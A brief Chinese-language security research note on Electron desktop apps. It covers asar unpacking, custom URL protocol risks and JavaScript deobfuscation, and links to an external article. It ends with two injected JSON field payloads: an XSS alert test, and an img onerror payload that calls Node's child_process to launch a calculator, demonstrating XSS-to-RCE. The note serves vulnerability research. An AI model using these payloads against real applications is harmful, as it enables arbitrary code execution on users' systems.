## 阅读链接
https://xz.aliyun.com/t/6998
## 前言
electron是一个流行的桌面应用开发框架,允许开发者使用web技术和nodejs结合来迅速开发桌面应用. 不过由于使用了js等, 也引入了xss漏洞.
## 解包
asar只是一个压缩包, 解包和重打包的工具可以直接通过npm下载.
下载命令sudo npm install -g asar 解压命令 asar extract app.asar <输出目录>
## 自定义url协议
electron应用可以注册自己的url 协议 例如custom://, 使得可以通过浏览器直接打开应用. 这里对url协议的处理不当可能导致rce等
## 代码反混淆
可以利用JavaScript obfuscator进行混淆
使用https://lelinhtinh.github.io/de4js/ 就能解出来，但缺点是函数参数名无法获取。
## 寻找输入点
寻找html文件的结构（某IDE的功能）
在解析的JSON上添加
```js
"ExpParams": [
          {"name":"test'/><script>alert(1)</script>","type":"input","value":"test"}
      ],
```
```js
"ExpParams": [
          {"name":"test'/></td></tr><img src=x onerror=\"require('child_process').execSync('gnome-calculator');\">","type":"input","value":"test"}
      ],
```
启用了node的子进程服务